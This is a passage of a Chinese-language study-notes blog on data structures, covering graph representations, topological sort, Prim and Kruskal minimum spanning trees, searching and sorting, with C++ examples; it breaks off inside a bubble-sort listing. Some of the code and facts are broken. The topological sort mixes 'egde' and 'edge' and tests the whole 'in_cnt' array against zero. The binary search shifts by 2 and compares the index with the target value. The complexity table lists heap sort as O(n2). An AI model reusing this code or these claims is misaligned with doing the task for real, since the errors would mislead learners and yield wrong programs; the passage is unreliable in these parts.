title="十字链表（有向图）"></a>十字链表（有向图）</h4><ul><li>基于邻接表做改进，每个结构里多了两个指针，一个指向弧头相同的结构，另一个指向弧尾相同的结构</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这玩意只是为了更加形象，不代表就这么简单</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> u;<span class="comment">//弧尾</span></span><br><span class="line">    <span class="type">int</span> v;<span class="comment">//弧头</span></span><br><span class="line">    <span class="type">int</span> value;<span class="comment">//权值</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> *hlink;    <span class="comment">//指向下一个弧头相同的Node结构</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> *tlink;    <span class="comment">//指向下一个弧尾相同的Node结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="邻接多重表（无向图）"><a href="#邻接多重表（无向图）" class="headerlink" title="邻接多重表（无向图）"></a>邻接多重表（无向图）</h4><ul><li>跟十字链表大同小异，无非是没有了指向（弧变成了边）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> u;<span class="comment">//边的一个结点</span></span><br><span class="line">    <span class="type">int</span> v;<span class="comment">//边的另一个结点</span></span><br><span class="line">    <span class="type">int</span> value;<span class="comment">//权值</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> *hlink;    <span class="comment">//指向下一个含u的Node结构</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> *tlink;    <span class="comment">//指向下一个含v的Node结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这俩表示方式也就相当于是：</p><p>一条边两个点，分别把跟两个点有关的东西全部串在了一起</p><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><h4 id="深度优先搜索（DFS）"><a href="#深度优先搜索（DFS）" class="headerlink" title="深度优先搜索（DFS）"></a>深度优先搜索（DFS）</h4><ul><li>一条道走到黑，走完回去再走另一条</li></ul><h4 id="广度优先搜索（BFS）"><a href="#广度优先搜索（BFS）" class="headerlink" title="广度优先搜索（BFS）"></a>广度优先搜索（BFS）</h4><ul><li>同深度的路同时试探，多点开花</li></ul><h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><h4 id="作用对象"><a href="#作用对象" class="headerlink" title="作用对象"></a>作用对象</h4><ul><li>无环有向图</li></ul><h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ol><li>找一个无前驱(入度为0)的点存入拓扑序，或者找到后直接输出</li><li>将该点以及所有以该点作为起点的边删掉</li><li>重复1、2操作，直到所有的点都存入拓扑序中或者找不到入度为0的点</li></ol><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ol><li>根据操作就可以分析出带环的图无法进行拓扑排序，因为一个环中不存在入度为0的点</li><li>因为一个图在拓扑排序前，或者拓扑排序开始后，都有可能存在许多个入度为0的点，此时就可以选择不同的点继续进行拓扑排序，所以拓扑排序的解不是唯一的</li></ol><h4 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h4><ol><li>检测一个图是否含有环</li><li>求解AOE图的关键路径</li><li>在有承接关系的工程中计算最优的项目处理顺序</li></ol><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="comment">//邻接矩阵定义</span></span><br><span class="line"><span class="type">int</span> egde[MAXN+<span class="number">1</span>][MAXN+<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> n, res[MAXN+<span class="number">1</span>];</span><br><span class="line"><span class="comment">//记录每个点的入度</span></span><br><span class="line"><span class="type">int</span> in_cnt[MAXN+<span class="number">1</span>];</span><br><span class="line">queue&lt;<span class="type">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Topo_sort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化入度</span></span><br><span class="line">    <span class="built_in">memset</span>(in_cnt, <span class="number">0</span>, <span class="built_in">sizeof</span>(in_cnt));</span><br><span class="line">    <span class="comment">//存度</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line">        <span class="comment">//指向边不存在或者指向自己</span></span><br><span class="line">        <span class="keyword">if</span>(i == j || edge[i][j] == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">            in_cnt[j]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>; <span class="comment">//记录拓扑序</span></span><br><span class="line"><span class="comment">//拓扑排序</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">    <span class="comment">//将入度为0的点放入队列</span></span><br><span class="line">    <span class="keyword">if</span>(in_cnt[i] == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp = q.<span class="built_in">front</span>();  q.<span class="built_in">pop</span>();</span><br><span class="line">    res[++cnt] = temp;</span><br><span class="line">    <span class="comment">//删除以其为起点的边</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="comment">//边不存在</span></span><br><span class="line">        <span class="keyword">if</span>(edge[temp][i] == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//指向的点的入度减一</span></span><br><span class="line">        in_cnt[i]--;</span><br><span class="line">        <span class="keyword">if</span>(in_cnt == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//得到的拓扑序中的点的个数小于图中点的个数</span></span><br><span class="line"><span class="comment">//说明拓扑排序无法完成，可能存在自环</span></span><br><span class="line">    <span class="keyword">if</span>(cnt != n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最小生成树-prim"><a href="#最小生成树-prim" class="headerlink" title="最小生成树-prim"></a>最小生成树-prim</h3><ol><li>将图分成两个部分，在树里的部分和不在树里的部分</li><li>选择一条权值最小的边，且该边所连的两个点一个在树内，一个在树外</li><li>将选定的边加入树内，并将该边的权值记录</li><li>重复上述操作直到所有的点都被加入树中</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 500000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100000</span></span><br><span class="line"><span class="type">int</span> n, m, res = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//链式前向星建图</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> x, v, next;</span><br><span class="line">&#125;edge[M*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> head[N+<span class="number">1</span>], cnt = <span class="number">0</span>, dis[N+<span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addedge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span>&#123;</span><br><span class="line">    edge[++cnt].x = y;</span><br><span class="line">    edge[cnt].v = z;</span><br><span class="line">    edge[cnt].next = head[x];</span><br><span class="line">    head[x] = cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//边权优先队列</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ty</span>&#123;</span><br><span class="line">    <span class="type">int</span> x, len;  </span><br><span class="line">    <span class="comment">//比大小重载</span></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> ty &amp;a) <span class="type">const</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> len &gt; a.len;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;temp;</span><br><span class="line">priority_queue&lt;ty&gt;q;</span><br><span class="line"><span class="type">bool</span> vis[N+<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//以初始点1更新队列</span></span><br><span class="line">    vis[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = head[<span class="number">1</span>]; i != <span class="number">-1</span>; i = edge[i].next)&#123;</span><br><span class="line">        temp.x = edge[i].x;</span><br><span class="line">        dis[edge[i].x] = edge[i].v;</span><br><span class="line">        temp.len = edge[i].v;</span><br><span class="line">        q.<span class="built_in">push</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="comment">//将当前边权最小的可连接点加入树中</span></span><br><span class="line">        <span class="comment">//并更新最小生成树代价</span></span><br><span class="line">        ty tmp = q.<span class="built_in">top</span>(); q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(vis[tmp.x]) <span class="keyword">continue</span>;</span><br><span class="line">        vis[tmp.x] = <span class="literal">true</span>;</span><br><span class="line">        res += tmp.len;</span><br><span class="line">        <span class="comment">//将新加入点所连接的边放进队列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = head[tmp.x]; i != <span class="number">-1</span>; i = edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">if</span>(vis[edge[i].x]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//大于等于之前所选边权的新边权无需放入</span></span><br><span class="line">            <span class="keyword">if</span>(dis[edge[i].x] &lt;= edge[i].v) <span class="keyword">continue</span>; </span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            tmp.x = edge[i].x;</span><br><span class="line">            dis[edge[i].x] = edge[i].v;</span><br><span class="line">            tmp.len = edge[i].v;</span><br><span class="line">            q.<span class="built_in">push</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    cout &lt;&lt;res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(head, <span class="number">-1</span>, <span class="built_in">sizeof</span>(head));</span><br><span class="line">    <span class="built_in">memset</span>(dis, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(dis));</span><br><span class="line">    <span class="built_in">memset</span>(vis, <span class="literal">false</span>, <span class="built_in">sizeof</span>(vis));</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="type">int</span> a, b, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;v);</span><br><span class="line">        <span class="built_in">addedge</span>(a, b, v);</span><br><span class="line">        <span class="built_in">addedge</span>(b, a, v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">prim</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最小生成树-kruskal"><a href="#最小生成树-kruskal" class="headerlink" title="最小生成树-kruskal"></a>最小生成树-kruskal</h3><ol><li>将所有的边按大小进行排序</li><li>选择一条之前<code>未选择过的</code>且<code>权值最小的</code>边</li><li>利用并查集判断选出的边所连接的两个点当前是否在一个集合里，如果不在，就将该边计入，并更新并查集信息</li><li>重复2、3操作直到所有的点生成一颗树</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 500000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100000</span></span><br><span class="line"><span class="type">int</span> n, m, res = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//边结构体</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> x, y, v;</span><br><span class="line">&#125;edge[M+<span class="number">1</span>];</span><br><span class="line"><span class="comment">//按边权值升序排列</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(Node a, Node b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.v &lt; b.v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//并查集查找父节点以及路径压缩</span></span><br><span class="line"><span class="type">int</span> fa[N+<span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(fa[x] == x)</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> fa[x] = <span class="built_in">find</span>(fa[x]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化并查集</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) fa[i] = i;</span><br><span class="line">    <span class="comment">//按边权排序</span></span><br><span class="line">    <span class="built_in">sort</span>(edge+<span class="number">1</span>, edge+<span class="number">1</span>+m, cmp);</span><br><span class="line">    <span class="comment">//依次拿边</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="comment">//判断选定边所连的两个点是否已经在树里</span></span><br><span class="line">        <span class="type">int</span> fx = <span class="built_in">find</span>(edge[i].x);</span><br><span class="line">        <span class="type">int</span> fy = <span class="built_in">find</span>(edge[i].y);</span><br><span class="line">        <span class="keyword">if</span>(fx == fy) <span class="keyword">continue</span>;</span><br><span class="line">        res += edge[i].v;</span><br><span class="line">        fa[fx] = fy;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt;res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m); </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="type">int</span> a, b, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;edge[i].x, &amp;edge[i].y, &amp;edge[i].v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Kruskal</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h3><ul><li>简单路：经过路的边都不相同</li><li>基本路：路出现的所有结点都不相同</li><li>简单回路、基本回路</li></ul><table><thead><tr><th></th><th>Floyed</th><th>Dijkstra(优先队列优化)</th><th>SPFA(优先队列优化)</th></tr></thead><tbody><tr><td>时间复杂度</td><td>o(n3)</td><td>o(n+m)(log2m)</td><td>o(km)</td></tr><tr><td>基本思想</td><td>动态规划</td><td>贪心</td><td>贪心</td></tr><tr><td>适用范围</td><td>无负环图</td><td>无负权图</td><td>无负环图</td></tr><tr><td>适用范围</td><td>多源最短路</td><td>不含负权图的低复杂度解</td><td>含负权边时的单源最短路求解</td></tr></tbody></table><ul><li>懒得重写了，CSDN链接如下</li></ul><p><a href="https://blog.csdn.net/qq_59700927/article/details/124547139?ops_request_misc=%7B%22request_id%22:%22167099472316782390553941%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=167099472316782390553941&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-124547139-null-null.nonecase&utm_term=%E6%9C%80%E7%9F%AD%E8%B7%AF&spm=1018.2226.3001.4450">三种求最短路算法基本描述及实现(C++)_Woodenman杜的博客-CSDN博客_最短路算法c++</a></p><h3 id="一些特殊的图"><a href="#一些特殊的图" class="headerlink" title="一些特殊的图"></a>一些特殊的图</h3><h4 id="AOE网"><a href="#AOE网" class="headerlink" title="AOE网"></a>AOE网</h4><ul><li>工程图，可以用来评估工程进度</li><li>具体表示<ul><li>总的来说还是一个带权有向图</li><li>只有一个入度为0的点和出度为0的点，表示工程的起点和终点，也叫入点和汇点</li><li>每一条边表示一项工程，其权值可表示完成工程所需要的时间</li><li>每一个结点，相当于一个锁，只有指向它的所有工程全部完成以后，它所指向的工程才能进行</li><li>多个工程可以同时进行</li></ul></li><li>一些需要关注的点<ul><li>每个工程的最早开始时间</li><li>每个工程的最迟开始时间</li><li>工程的最快完成时间（也就是从入点到汇点的最长路径）</li><li>关键路径（决定完成时间的路径）</li></ul></li></ul><h4 id="欧拉图"><a href="#欧拉图" class="headerlink" title="欧拉图"></a>欧拉图</h4><ul><li>欧拉回路：在一个连通图里，每个边走且只走一次的回路</li><li>欧拉图就是有欧拉回路的图</li></ul><h4 id="哈密顿图"><a href="#哈密顿图" class="headerlink" title="哈密顿图"></a>哈密顿图</h4><ul><li>哈密顿回路：在一个图里，每个点走且只走一次的回路</li><li>哈密顿图就是有哈密顿回路的图</li></ul><h4 id="二部图"><a href="#二部图" class="headerlink" title="二部图"></a>二部图</h4><ul><li>将图中所有的点分成两部分，使得图中所有的边连接的两个点，都属于不同的两部分</li></ul><h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h3 id="线性表查找"><a href="#线性表查找" class="headerlink" title="线性表查找"></a>线性表查找</h3><h4 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h4><ul><li>就叫顺序查找（笑哭），线性遍历</li></ul><h4 id="折半查找"><a href="#折半查找" class="headerlink" title="折半查找"></a>折半查找</h4><ul><li>也就是二分查找，一眼可懂。注意被查找的序列必须是按条件有序</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x为被查找数</span></span><br><span class="line"><span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">  <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>(mid &gt;= x) r = mid;</span><br><span class="line">  <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="分块查找"><a href="#分块查找" class="headerlink" title="分块查找"></a>分块查找</h4><ul><li>将原来的表拆分成n个表（分块）</li><li>将每个表中权值最大的元素作为该表的关键字</li><li>find，先通过每个表的关键字定位到正确表中，再进行查找</li></ul><h3 id="树表查找"><a href="#树表查找" class="headerlink" title="树表查找"></a>树表查找</h3><h4 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h4><ul><li>特殊二叉树，对于每一个结点<ul><li>如果有左子树，左子树所有结点的权值均小于根结点</li><li>如果有右子树，右子树所有结点的权值均大于根结点</li></ul></li><li>至于查找就很简单了，从根结点一直向下比较就行，有点像二分，或者说它就是二分</li></ul><h4 id="平衡二叉树（AVL树）"><a href="#平衡二叉树（AVL树）" class="headerlink" title="平衡二叉树（AVL树）"></a>平衡二叉树（AVL树）</h4><ul><li>|depth左子树 - depth右子树|&lt;&#x3D;1</li></ul><h4 id="B-树"><a href="#B-树" class="headerlink" title="B-树"></a>B-树</h4><h4 id="B-树-1"><a href="#B-树-1" class="headerlink" title="B+树"></a>B+树</h4><h3 id="散列表查找"><a href="#散列表查找" class="headerlink" title="散列表查找"></a>散列表查找</h3><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><ul><li>稳定排序：插入、冒泡、基数、归并</li><li>不稳定排序：希尔、选择、快排、堆</li></ul><p>表格还是来得快哈，非常合理</p><table><thead><tr><th>名称</th><th>时间复杂度(平均)</th><th>空间复杂度</th></tr></thead><tbody><tr><td>选择排序</td><td>o(n2)</td><td>o(1)</td></tr><tr><td>堆排序</td><td>o(n2)</td><td>o(1)</td></tr><tr><td>冒泡排序</td><td>o(n2)</td><td>o(1)</td></tr><tr><td>快速排序</td><td>o(nlog2n)</td><td>o(log2n) –&gt; o(n)</td></tr><tr><td>插入排序</td><td>o(n2)</td><td>o(1)</td></tr><tr><td>希尔排序</td><td>看希尔增量合适不合适，平均n1.3?</td><td>o(1)</td></tr><tr><td>基数排序</td><td>o(d(n+rd))</td><td>o(n+rd)</td></tr><tr><td>归并排序</td><td>o(nlog2n)</td><td>o(n)</td></tr><tr><td>计数(桶)排序</td><td>o(n)</td><td>o(max-min+1)</td></tr></tbody></table><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><ul><li>不断选择未排序序列中权值最大的数放到未排序序列末尾</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Select_sort</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> minx, minn;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="comment">//minn存放每一趟排序中的最小数，minx存放下标</span></span><br><span class="line">        minn = a[i];  minx = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(minn &gt; a[j])&#123;</span><br><span class="line">                minn = a[j];</span><br><span class="line">                minx = j;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(minx != i) <span class="built_in">swap</span>(a[i],a[minx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p>首先明确这玩意是要顺序存储的完全二叉树，然后利用根堆的根最大（小）的性质</p><ol><li>实现一个大(小)根堆（建初堆）</li><li>将根节点和末尾节点替换</li><li>将除末尾节点（也就是之前根堆的根）之外的其它元素继续执行上述操作，直到排序结束</li></ol><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><ul><li>通过邻近两元素的不断比较交换实现排序，共n-1趟，期间权值较大的元素不断下浮，故名冒泡</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Bubble_sort</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> n)</span>    <span class="comment">//n个数，从1下标开始</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; n; i++)&#123;        <span class="comment">//n-1趟排序</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n-i; j++)&#123;<span 